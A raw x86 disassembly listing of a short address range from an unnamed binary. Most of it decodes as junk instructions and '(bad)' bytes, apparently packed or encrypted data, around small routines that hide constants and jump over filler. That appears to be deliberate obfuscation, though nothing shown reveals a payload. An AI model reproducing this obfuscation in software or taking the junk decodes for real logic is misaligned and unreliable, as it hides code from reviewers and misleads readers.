  40f0d4:	fisttp WORD PTR [ecx+0x48f4840a]
  40f0da:	inc    ecx
  40f0db:	repz push esp
  40f0dd:	retf   0x3f81
  40f0e0:	test   BYTE PTR [eax],dh
  40f0e2:	cmp    DWORD PTR [ecx-0x1db70262],0x67a15b4f
  40f0ec:	icebp  
  40f0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0ee:	pop    es
  40f0ef:	clc    
  40f0f0:	jecxz  0x40f165
  40f0f2:	and    eax,0x8974ed28
  40f0f7:	sub    edx,ecx
  40f0f9:	cs mov esp,0x777833c2
  40f0ff:	mov    bl,0xf1
  40f101:	imul   BYTE PTR [ebx-0x57499793]
  40f107:	mov    dl,0xad
  40f109:	repnz fsub st(6),st
  40f10c:	cdq    
  40f10d:	lods   eax,DWORD PTR ds:[esi]
  40f10e:	pusha  
  40f10f:	fstp   QWORD PTR [ebp+0x2952f16]
  40f115:	sahf   
  40f116:	sub    dl,BYTE PTR [eax]
  40f118:	push   edi
  40f119:	das    
  40f11a:	mov    eax,ds:0x3b8b08ce
  40f11f:	clc    
  40f120:	ins    DWORD PTR es:[edi],dx
  40f121:	(bad)  
  40f122:	dec    esi
  40f123:	jmp    0x40f144
  40f125:	stc    
  40f126:	aas    
  40f127:	data16 ins BYTE PTR es:[edi],dx
  40f129:	lea    eax,es:[edx-0x2b]
  40f12d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f12e:	dec    edi
  40f12f:	scas   eax,DWORD PTR es:[edi]
  40f130:	jl     0x40f0d8
  40f132:	div    DWORD PTR [edi]
  40f134:	xlat   BYTE PTR ds:[ebx]
  40f135:	push   cs
  40f136:	dec    eax
  40f137:	es jecxz 0x40f177
  40f13a:	or     eax,0xf8511bf
  40f13f:	adc    BYTE PTR [bp+si],ah
  40f142:	add    eax,0x8a7afebf
  40f147:	ins    DWORD PTR es:[edi],dx
  40f148:	inc    edx
  40f149:	fidiv  WORD PTR [edx+0x61]
  40f14c:	inc    edi
  40f14d:	lods   eax,DWORD PTR ds:[esi]
  40f14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f14f:	add    edi,DWORD PTR [edi+0x3cdabe3d]
  40f155:	and    bh,BYTE PTR [edx+0x47]
  40f158:	loop   0x40f0ee
  40f15a:	mov    eax,ds:0xd07b13ed
  40f15f:	or     bl,BYTE PTR [eax-0x68]
  40f162:	and    bl,ah
  40f164:	es loope 0x40f148
  40f167:	(bad)  [ebx+0x33]
  40f16a:	push   ds
  40f16b:	push   ss
  40f16c:	ja     0x40f16f
  40f16e:	sbb    dl,BYTE PTR [edi+eax*8-0x6c]
  40f172:	int    0x88
  40f174:	jmp    0xbe2b:0xbb5d686c
  40f17b:	fistp  WORD PTR [ebx]
  40f17d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f17e:	inc    ebp
  40f17f:	add    DWORD PTR [esi-0x4caffc83],0x5d
  40f186:	adc    BYTE PTR [esi],dh
  40f188:	loopne 0x40f1a5
  40f18a:	jmp    0xa2b8:0xcab54270
  40f191:	mov    ecx,DWORD PTR [eax]
  40f193:	imul   BYTE PTR [ebx+ebx*1-0x3a7b9f40]
  40f19a:	xor    BYTE PTR [esi+0x7c29b825],bl
  40f1a0:	cld    
  40f1a1:	hlt    
  40f1a2:	popa   
  40f1a3:	mov    cs,WORD PTR [edi+edi*4+0xa]
  40f1a7:	mov    ecx,0x9e03cba9
  40f1ac:	dec    eax
  40f1ad:	sbb    al,0x10
  40f1af:	pop    esi
  40f1b0:	loop   0x40f17a
  40f1b2:	pop    ecx
  40f1b3:	popa   
  40f1b4:	daa    
  40f1b5:	xchg   ebp,edi
  40f1b7:	ss pusha 
  40f1b9:	js     0x40f177
  40f1bb:	je     0x40f15b
  40f1bd:	aam    0xf3
  40f1bf:	cwde   
  40f1c0:	jnp    0x40f1e2
  40f1c2:	or     eax,0x75eaaa0b
  40f1c7:	outs   dx,BYTE PTR ds:[esi]
  40f1c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1c9:	and    al,0x18
  40f1cb:	test   eax,0x1986e87a
  40f1d0:	mov    dh,0x8c
  40f1d2:	push   eax
  40f1d3:	pop    esp
  40f1d4:	inc    ecx
  40f1d5:	(bad)  
  40f1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d7:	aas    
  40f1d8:	out    0x1a,eax
  40f1da:	pop    esp
  40f1db:	and    eax,0x1a745260
  40f1e0:	mov    dl,0x29
  40f1e2:	mov    al,ds:0x7a69c62b
  40f1e7:	adc    eax,0x91b3513a
  40f1ec:	fs push edi
  40f1ee:	push   edx
  40f1ef:	cmp    edi,ecx
  40f1f1:	arpl   WORD PTR [esi-0x208a6d11],si
  40f1f7:	or     esi,esi
  40f1f9:	cmp    al,0x87
  40f1fb:	xor    ah,BYTE PTR [edi+eax*4+0x52]
  40f1ff:	pop    ebp
  40f200:	arpl   WORD PTR [edx*4+0x28c286a6],sp
  40f207:	dec    ebp
  40f208:	xchg   esi,eax
  40f209:	shl    BYTE PTR [edi],0x4
  40f20c:	ins    BYTE PTR es:[edi],dx
  40f20d:	dec    edi
  40f20e:	retf   
  40f20f:	adc    esp,DWORD PTR [esi-0x5cca24a]
  40f215:	jl     0x40f22b
  40f217:	fist   DWORD PTR [ecx+0x50]
  40f21a:	mov    esi,0x74115836
  40f21f:	pop    eax
  40f220:	lea    eax,[ebp+0x1d]
  40f223:	pushf  
  40f224:	out    dx,eax
  40f225:	push   es
  40f226:	adc    DWORD PTR [eax],0xe20ab8e3
  40f22c:	mov    ebx,0x8e2ea032
  40f231:	xlat   BYTE PTR ds:[ebx]
  40f232:	jnp    0x40f1cc
  40f234:	mov    BYTE PTR [ebx],al
  40f236:	adc    al,0x21
  40f238:	mov    ebx,0x32b78e5
  40f23d:	rcl    BYTE PTR [eax-0x2b],0x4f
  40f241:	in     al,dx
  40f242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f244:	sbb    DWORD PTR [ecx+0x316da998],ecx
  40f24a:	pop    ecx
  40f24b:	arpl   WORD PTR ds:0x7e042d71,di
  40f251:	push   es
  40f252:	aam    0x73
  40f254:	inc    edx
  40f255:	add    al,0xad
  40f257:	add    al,0x29
  40f259:	test   DWORD PTR [esi+0x5d],esi
  40f25c:	(bad)  [edx+0x32a528a2]
  40f262:	stc    
  40f263:	(bad)  
  40f264:	adc    eax,0xb60daac0
  40f269:	enter  0xfb15,0x8d
  40f26d:	lea    ebx,[edx+esi*2+0x2650873e]
  40f274:	jmp    0x40f223
  40f276:	(bad)  
  40f277:	sub    BYTE PTR [esi-0x44],dl
  40f27a:	mov    eax,0x6e44a749
  40f27f:	mov    dl,0x8a
  40f281:	rol    DWORD PTR ds:0xb8e5d3a2,0x38
  40f288:	jne    0x40f2cd
  40f28a:	jnp    0x40f20e
  40f28c:	mov    ds:0x5df04d93,al
  40f291:	jmp    0x40f2b2
  40f293:	fsubr  QWORD PTR [eax+0x66]
  40f296:	cs in  eax,dx
  40f298:	push   esp
  40f299:	clc    
  40f29a:	inc    esp
  40f29b:	add    al,0x92
  40f29d:	outs   dx,BYTE PTR ds:[esi]
  40f29e:	mov    eax,DWORD PTR ds:0x9d27fe94
  40f2a4:	mov    edi,ebp
  40f2a6:	mov    dl,0x87
  40f2a8:	daa    
  40f2a9:	and    bl,BYTE PTR [ebx]
  40f2ab:	out    0x4d,al
  40f2ad:	rol    bl,1
  40f2af:	inc    eax
  40f2b0:	rcr    DWORD PTR [ecx+eax*8-0x2eeb8568],0x9
  40f2b8:	or     bl,ch
  40f2ba:	(bad)  
  40f2bb:	aaa    
  40f2bc:	xor    ecx,esi
  40f2be:	adc    bh,BYTE PTR [esi]
  40f2c0:	xor    eax,0xcf157278
  40f2c5:	lods   al,BYTE PTR ds:[esi]
  40f2c6:	sbb    al,cl
  40f2c8:	sbb    eax,0x8746994
  40f2cd:	shr    DWORD PTR [esi+0x3ba2598a],0xb8
  40f2d4:	add    al,0xf
  40f2d6:	xor    eax,0x5b5d8c3d
  40f2db:	jnp    0x40f2ae
  40f2dd:	pop    ecx
  40f2de:	inc    edi
  40f2df:	out    dx,al
  40f2e0:	sbb    BYTE PTR [esi],dh
  40f2e2:	jae    0x40f30f
  40f2e4:	or     eax,esi
  40f2e6:	shl    BYTE PTR [eax+0x2234e3fb],1
  40f2ec:	add    eax,0x7c1bc845
  40f2f1:	push   ebx
  40f2f2:	loope  0x40f2bb
  40f2f4:	and    edx,eax
  40f2f6:	xor    eax,0x9b45339a
  40f2fb:	mov    BYTE PTR [eax],dh
  40f2fd:	pop    edx
  40f2fe:	jnp    0x40f291
  40f300:	loopne 0x40f309
  40f302:	lea    ebp,[esi-0x27920497]
  40f308:	daa    
  40f309:	or     dl,0x1a
  40f30c:	(bad)  
  40f30e:	cld    
  40f30f:	out    0x6b,al
  40f311:	(bad)  
  40f312:	cdq    
  40f313:	test   ebp,ebp
  40f315:	mov    WORD PTR [edx],ss
  40f317:	gs retf 
  40f319:	mov    edi,0x184b83b8
  40f31e:	xchg   edx,eax
  40f31f:	push   0x1ba75212
  40f324:	xchg   ebp,eax
  40f325:	xchg   DWORD PTR ds:0x2bc2985a,edi
  40f32b:	outs   dx,BYTE PTR ds:[esi]
  40f32c:	add    BYTE PTR cs:[edx],al
  40f32f:	add    eax,0xc7c6da43
  40f334:	xchg   bl,bh
  40f336:	and    BYTE PTR [ecx],cl
  40f338:	push   ecx
  40f339:	repnz aaa 
  40f33b:	pushf  
  40f33c:	sub    bh,dl
  40f33e:	mov    dl,bl
  40f340:	dec    ebx
  40f341:	dec    eax
  40f342:	push   ss
  40f343:	pop    ebp
  40f344:	or     esp,DWORD PTR [edx-0x7e]
  40f347:	pushf  
  40f348:	mov    al,0xc6
  40f34a:	pushf  
  40f34b:	jbe    0x40f2d0
  40f34d:	mov    edx,0x5b5e1062
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x3f
  40f384:	dec    edx
  40f385:	jmp    0x18e91f34
  40f38a:	sbb    BYTE PTR [esi-0x16e7e7ec],bh
  40f390:	adc    cl,BYTE PTR [edi+0x29]
  40f393:	jbe    0x40f3e5
  40f395:	test   BYTE PTR [ebx],ch
  40f397:	xor    eax,DWORD PTR [edx]
  40f399:	ret    
  40f39a:	cwde   
  40f39b:	aad    0x60
  40f39d:	inc    eax
  40f39e:	shr    BYTE PTR [eax],cl
  40f3a0:	aas    
  40f3a1:	gs ss repz loope 0x40f329
  40f3a6:	dec    esi
  40f3a7:	sbb    eax,0x422e6940
  40f3ac:	push   cs
  40f3ad:	(bad)  [edx-0x4580d954]
  40f3b3:	call   DWORD PTR [edi]
  40f3b5:	and    WORD PTR [ecx+edi*4-0x667d0dfb],ax
  40f3bd:	hlt    
  40f3be:	retf   
  40f3bf:	push   ss
  40f3c0:	sbb    eax,0x77e37362
  40f3c5:	push   eax
  40f3c6:	mov    ah,bh
  40f3c8:	xchg   esi,eax
  40f3c9:	out    0x81,al
  40f3cb:	add    esp,DWORD PTR [ecx-0x2bb74556]
  40f3d1:	loopne 0x40f3ef
  40f3d3:	cld    
  40f3d4:	xchg   ebp,eax
  40f3d5:	daa    
  40f3d6:	sar    DWORD PTR [esp+ecx*1+0x1c03ae70],cl
  40f3dd:	faddp  st(2),st
  40f3df:	mov    DWORD PTR [esi],ebx
  40f3e1:	jl     0x40f44b
  40f3e3:	in     eax,dx
  40f3e4:	add    DWORD PTR [eax],0x6d6ec65b
  40f3ea:	ret    
  40f3eb:	add    bh,BYTE PTR [edi]
  40f3ed:	pusha  
  40f3ee:	jmp    0x1ea8:0xbc20610a
  40f3f5:	pop    edi
  40f3f6:	add    al,0x9f
  40f3f8:	dec    eax
  40f3f9:	mov    esi,0x66f396e3
  40f3fe:	arpl   WORD PTR [ecx],sp
  40f400:	cld    
  40f401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f402:	xchg   DWORD PTR [edi+ecx*4-0xa24acfd],ebx
  40f409:	dec    ecx
  40f40a:	inc    esi
  40f40b:	adc    esi,DWORD PTR [edi-0x77]
  40f40e:	add    edi,ebp
  40f410:	ins    BYTE PTR es:[edi],dx
  40f411:	mov    ch,0xd0
  40f413:	shl    BYTE PTR [ebx-0x6a],1
  40f416:	(bad)  
  40f417:	mov    ds:0x78cfb377,eax
  40f41c:	sub    al,0xb8
  40f41e:	sub    edx,edi
  40f420:	xchg   edi,eax
  40f421:	sub    eax,0xdfbcc2ce
  40f426:	jne    0x40f3b9
  40f428:	fs clc 
  40f42a:	shr    esi,0x78
  40f42d:	or     esp,eax
  40f42f:	pop    esi
  40f430:	ja     0x40f415
  40f432:	ret    0xa713
  40f435:	clc    
  40f436:	xor    esp,edx
  40f438:	outs   dx,DWORD PTR ds:[esi]
  40f439:	xchg   edi,eax
  40f43a:	adc    DWORD PTR [eax-0x43],ebp
  40f43d:	jno    0x40f40f
  40f43f:	sbb    BYTE PTR [edi+0x4d5d268f],dl
  40f445:	loope  0x40f485
  40f447:	push   esi
  40f448:	and    dh,dh
  40f44a:	aad    0xf5
  40f44c:	call   0xc760:0x31dc024f
  40f453:	xchg   cx,ax
  40f455:	fisub  WORD PTR [ebx+0x58]
  40f458:	adc    ch,BYTE PTR [ebx+0x3f]
  40f45b:	loop   0x40f4ad
  40f45d:	cmp    DWORD PTR ds:0x2c6dbe06,ebp
  40f463:	(bad)  
  40f464:	xchg   ebp,eax
  40f465:	dec    ecx
  40f466:	out    dx,eax
  40f467:	jo     0x40f3eb
  40f469:	mov    bl,0x14
  40f46b:	adc    eax,0x54cc1d2d
  40f470:	inc    edx
  40f471:	dec    edi
  40f472:	mov    cl,0x72
  40f474:	jge    0x40f4b6
  40f476:	xlat   BYTE PTR ds:[ebx]
  40f477:	lea    edi,[ebx+0x6e]
  40f47a:	push   ebx
  40f47b:	push   esp
  40f47c:	ins    DWORD PTR es:[edi],dx
  40f47d:	cmp    al,0x56
  40f47f:	jg     0x40f42c
  40f481:	pop    es
  40f482:	cwde   
  40f483:	dec    ebp
  40f484:	call   FWORD PTR [esi+0x62226f93]
  40f48a:	enter  0xd7be,0x4
  40f48e:	shl    DWORD PTR [ebp-0x58],cl
  40f491:	call   0x8567b417
  40f496:	pop    eax
  40f497:	jo     0x40f4ab
  40f499:	and    eax,0xfff31a37
  40f49e:	sbb    WORD PTR [ecx+ebp*1],0xff8d
  40f4a3:	jp     0x40f426
  40f4a5:	xor    al,0x6c
  40f4a7:	sbb    ebp,DWORD PTR [ebx]
  40f4a9:	push   ebp
  40f4aa:	mov    bh,0x7e
  40f4ac:	fs out 0x90,eax
  40f4af:	or     eax,0xffffffc9
  40f4b2:	pop    eax
  40f4b3:	outs   dx,BYTE PTR ds:[esi]
  40f4b4:	mov    ecx,0xf3c5948b
  40f4b9:	sbb    BYTE PTR [edx+eiz*2],dl
  40f4bc:	xor    dh,dl
  40f4be:	inc    ebp
  40f4bf:	fisub  WORD PTR [ecx+0x716cc270]
  40f4c5:	mov    ecx,ebx
  40f4c7:	dec    esp
  40f4c8:	adc    dh,bl
  40f4ca:	xchg   esi,eax
  40f4cb:	js     0x40f49c
  40f4cd:	xchg   ebx,eax
  40f4ce:	jns    0x40f495
  40f4d0:	inc    esp
  40f4d1:	in     eax,0x6b
  40f4d3:	inc    edx
  40f4d4:	xchg   esi,eax
  40f4d5:	fwait
  40f4d6:	mov    esp,0xc28b32af
  40f4db:	scas   al,BYTE PTR es:[edi]
  40f4dc:	dec    esi
  40f4dd:	xchg   esi,eax
  40f4de:	lds    ebx,FWORD PTR [esi]
  40f4e0:	xchg   BYTE PTR [ebx],cl
  40f4e2:	loop   0x40f528
  40f4e4:	cmp    edi,ecx
  40f4e6:	lds    ebp,FWORD PTR [eax+0x149e986]
  40f4ec:	or     DWORD PTR [ebx+0x476a5f56],ebp
  40f4f2:	mov    DWORD PTR [ebx],ebx
  40f4f4:	jae    0x40f49c
  40f4f6:	inc    esp
  40f4f7:	dec    eax
  40f4f8:	inc    esi
  40f4f9:	cmp    ebp,DWORD PTR [edi+0x389778e2]
  40f4ff:	es in  eax,0x3e
  40f502:	test   al,0xd
  40f504:	mov    WORD PTR [edx-0x2e],fs
  40f507:	jns    0x40f4e0
  40f509:	aam    0x5
  40f50b:	jge    0x40f50e
  40f50d:	stc    
  40f50e:	rol    ebp,0xba
  40f511:	sbb    bl,0x30
  40f514:	ds pop esi
  40f516:	cmp    al,0xe0
  40f518:	outs   dx,BYTE PTR ds:[esi]
  40f519:	test   eax,edx
  40f51b:	mov    eax,0xc8a0a055
  40f520:	adc    dh,bl
  40f522:	ret    0xbf68
  40f525:	dec    ecx
  40f526:	xchg   ebx,eax
  40f527:	daa    
  40f528:	neg    ecx
  40f52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f52b:	ret    
  40f52c:	arpl   WORD PTR [edi-0x3],sp
  40f52f:	xchg   edi,eax
  40f530:	(bad)  
  40f531:	push   ecx
  40f532:	mov    esp,0x3b06dade
  40f537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f538:	js     0x40f558
  40f53a:	(bad)  
  40f53b:	lock mov ds:0x1dabcbb9,al
  40f541:	adc    al,0xdb
  40f543:	push   ecx
  40f544:	repnz adc ch,BYTE PTR [ebx+0x60]
  40f548:	pop    ebx
  40f549:	xchg   edi,eax
  40f54a:	xor    ah,BYTE PTR [ebp+0x6c]
  40f54d:	sti    
  40f54e:	retf   0xc88
  40f551:	psubusb mm4,QWORD PTR [edi+edi*8+0x7d]
  40f556:	fbld   TBYTE PTR [ecx]
  40f558:	call   0x9ecfdaa9
  40f55d:	push   esp
  40f55e:	xchg   ecx,eax
  40f55f:	fcomp  DWORD PTR [ebx-0x6a]
  40f562:	xor    eax,0xf01fb503
  40f567:	fst    QWORD PTR [edx-0x5]
  40f56a:	jo     0x40f5d2
  40f56c:	inc    eax
  40f56d:	std    
  40f56e:	loop   0x40f5a9
  40f570:	(bad)  
  40f571:	leave  
  40f572:	dec    ecx
  40f573:	ja     0x40f555
  40f575:	retf   0x2f80
  40f578:	aas    
  40f579:	inc    edx
  40f57a:	xchg   ecx,eax
  40f57b:	cwde   
  40f57c:	cmc    
  40f57d:	shr    BYTE PTR [ebx+0x5df85208],0xb0
  40f584:	js     0x40f5c6
  40f586:	popf   
  40f587:	and    ebx,DWORD PTR [eax+0x126d5967]
  40f58d:	and    edi,DWORD PTR [esi-0x4f4ef594]
  40f593:	xor    al,0xd8
  40f595:	scas   eax,DWORD PTR es:[edi]
  40f596:	dec    ebx
  40f597:	test   DWORD PTR [edx-0x4170d7ae],esi
  40f59d:	jnp    0x40f56c
  40f59f:	push   edi
  40f5a0:	(bad)  
  40f5a2:	dec    eax
  40f5a3:	add    esp,DWORD PTR ds:0x70f6089
  40f5a9:	mov    edx,0xebfc9ce0
  40f5ae:	sbb    eax,DWORD PTR [edi]
  40f5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b1:	xchg   esi,eax
  40f5b2:	arpl   ax,ax
  40f5b4:	jp     0x40f610
  40f5b6:	shl    BYTE PTR ds:0xa7634363,1
  40f5bc:	mov    WORD PTR [ebx],?
  40f5be:	mov    esi,0xfa66c60c
  40f5c3:	imul   edx,DWORD PTR [ebx+0x223af887],0xffffffd0
  40f5ca:	cmp    al,BYTE PTR ds:0x70683a60
  40f5d0:	pop    ebx
  40f5d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5d2:	(bad)  
  40f5d4:	jl     0x40f5a2
  40f5d6:	int3   
  40f5d7:	sbb    eax,0xd89b7ae3
  40f5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5dd:	dec    edi
  40f5de:	mov    eax,ds:0xe6532cc
  40f5e3:	(bad)  
  40f5e4:	jle    0x40f5cd
  40f5e6:	pop    es
  40f5e7:	ret    0x2d5b
  40f5ea:	mov    eax,0x436ddef4
  40f5ef:	inc    eax
  40f5f0:	inc    ebx
  40f5f1:	fiadd  DWORD PTR [edi]
  40f5f3:	call   edx
  40f5f5:	mov    bh,0xef
  40f5f7:	push   esp
  40f5f8:	dec    ebp
  40f5f9:	mov    DWORD PTR [edx],eax
  40f5fb:	(bad)  
  40f5fc:	pop    ss
  40f5fd:	popa   
  40f5fe:	and    eax,0xca24de1c
  40f603:	fxch   st(6)
  40f605:	lock inc esp
  40f607:	mov    eax,0x25244a23
  40f60c:	repnz add ebp,DWORD PTR [edi+0x2930cdd4]
  40f613:	scas   eax,DWORD PTR es:[edi]
  40f614:	out    dx,al
  40f615:	sub    eax,0xafa8c0af
  40f61a:	popf   
  40f61b:	push   edi
  40f61c:	mov    eax,0xe7068d2c
  40f621:	push   ebp
  40f622:	adc    edi,ebp
  40f624:	faddp  st(5),st
  40f626:	mov    DWORD PTR [ecx-0x6042ba3d],ebp
  40f62c:	(bad)  
  40f62d:	push   ebx
  40f62e:	push   0xdf4824e1
  40f633:	lea    ebx,[bx+0x7f]
  40f637:	and    DWORD PTR [ecx-0x20],eax
  40f63a:	rcl    DWORD PTR [esi-0x124b0c4],1
  40f640:	mov    ecx,DWORD PTR [ebp-0x8]
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422558
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42268c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx+0x70611008],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	(bad)  
  40f732:	std    
  40f733:	sub    eax,0xabcbf2e
  40f738:	arpl   WORD PTR [ecx],sp
  40f73a:	sub    al,0x94
  40f73c:	jmp    0x2006:0xa833356a
  40f743:	ror    DWORD PTR fs:[edx+ebp*2-0x6b],1
  40f748:	mov    BYTE PTR [edx],ch
  40f74a:	out    dx,eax
  40f74b:	je     0x40f73a
  40f74d:	jb     0x40f753
  40f74f:	gs xor al,0x7f
  40f752:	mov    ebx,0x535bc871
  40f757:	cmp    al,0xab
  40f759:	sub    ecx,DWORD PTR [ebx+0x38]
  40f75c:	push   0xab91a138
  40f761:	in     al,0x46
  40f763:	adc    al,BYTE PTR [eax-0x6c]
  40f766:	cmp    DWORD PTR [eax-0x3],ebx
  40f769:	or     DWORD PTR [esi-0x3a02aaae],0x344ab256
  40f773:	fdivrp st(5),st
  40f775:	push   ecx
  40f776:	out    0x44,eax
  40f778:	loopne 0x40f740
  40f77a:	adc    ch,BYTE PTR [edx+0x2b42ad6e]
  40f780:	sti    
  40f781:	bound  eax,QWORD PTR [edx]
  40f783:	daa    
  40f784:	pop    edi
  40f785:	stc    
  40f786:	js     0x40f742
  40f788:	aam    0x82
  40f78a:	pop    edi
  40f78b:	dec    edx
  40f78c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f78d:	pop    ss
  40f78e:	pop    edi
  40f78f:	mov    edi,0xff195387
  40f794:	xchg   ecx,eax
  40f795:	sub    eax,esp
  40f797:	(bad)  
  40f798:	arpl   bp,bp
  40f79a:	jne    0x40f7e5
  40f79c:	inc    edx
  40f79d:	loopne 0x40f731
  40f79f:	xor    ebp,eax
  40f7a1:	push   0x2e
  40f7a3:	(bad)  
  40f7a4:	or     eax,0x8ef749e0
  40f7a9:	mov    ?,WORD PTR [ebx-0x4a2d7008]
  40f7af:	inc    ebp
  40f7b0:	adc    al,0x36
  40f7b2:	sub    eax,0xa11209a7
  40f7b7:	mov    al,0xf9
  40f7b9:	popa   
  40f7ba:	lock mov ch,0xc6
  40f7bd:	jmp    0x40f77e
  40f7bf:	aad    0x41
  40f7c1:	push   ecx
  40f7c2:	je     0x40f82b
  40f7c4:	(bad)  
  40f7c5:	fwait
  40f7c6:	push   ebx
  40f7c7:	leave  
  40f7c8:	test   eax,0x9e1bee82
  40f7cd:	(bad)  
  40f7ce:	es jle 0x40f82a
  40f7d1:	mov    ecx,0x5ceb289b
  40f7d6:	xor    DWORD PTR [ecx+0x6c],esi
  40f7d9:	xor    eax,0xdb1bf48f
  40f7de:	mov    BYTE PTR [eax],0xc7
  40f7e1:	cmp    DWORD PTR [eax-0x79],edx
  40f7e4:	pop    edi
  40f7e5:	test   al,0x49
  40f7e7:	mov    dh,0x5e
  40f7e9:	and    BYTE PTR ds:[edi],dl
  40f7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7ed:	pop    ebp
  40f7ee:	inc    eax
  40f7ef:	std    
  40f7f0:	sbb    al,0xd2
  40f7f2:	jle    0x40f862
  40f7f4:	outs   dx,DWORD PTR ds:[esi]
  40f7f5:	outs   dx,BYTE PTR ds:[esi]
  40f7f6:	dec    edx
  40f7f7:	addr16 repz pushf 
  40f7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7fb:	repnz push 0xffffffa6
  40f7fe:	push   0x7d68538d
  40f803:	pop    ebx
  40f804:	loop   0x40f794
  40f806:	sub    bl,BYTE PTR [ebx+ebx*1-0x55]
  40f80a:	mov    ds,WORD PTR [ecx+eiz*1-0x52]
  40f80e:	adc    esp,DWORD PTR [eax-0x71]
  40f811:	ror    DWORD PTR [edi+eax*2+0x3129ce8a],cl
  40f818:	je     0x40f818
  40f81a:	adc    eax,0x4a18f439
  40f81f:	push   0x4e
  40f821:	sub    eax,0xdfd5de91
  40f826:	inc    ebp
  40f827:	and    DWORD PTR ss:[edx+0x35],ebp
  40f82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f82c:	mov    cl,0xf3
  40f82e:	xchg   DWORD PTR ds:0x5b1d599,edi
  40f834:	test   ebx,esp
  40f836:	xor    bh,BYTE PTR [esi]
  40f838:	jns    0x40f84a
  40f83a:	dec    edx
  40f83b:	clc    
  40f83c:	bound  ecx,QWORD PTR [edi+edi*4-0x5a]
  40f840:	mov    DWORD PTR [esi-0x29],esp
  40f843:	cwde   
  40f844:	mov    ah,0x83
  40f846:	(bad)  
  40f847:	gs inc edi
  40f849:	dec    ecx
  40f84a:	inc    edi
  40f84b:	sbb    ecx,DWORD PTR [edi-0x159867b9]
  40f851:	imul   esi,DWORD PTR [eax+0x15],0x21861010
  40f858:	arpl   WORD PTR [edi+0x25],bp
  40f85b:	mov    eax,DWORD PTR [esi-0x4dface9a]
  40f861:	adc    dl,BYTE PTR [ebx+esi*1+0x4c]
  40f865:	pop    edx
  40f866:	aam    0x81
  40f868:	aad    0x47
  40f86a:	push   ebx
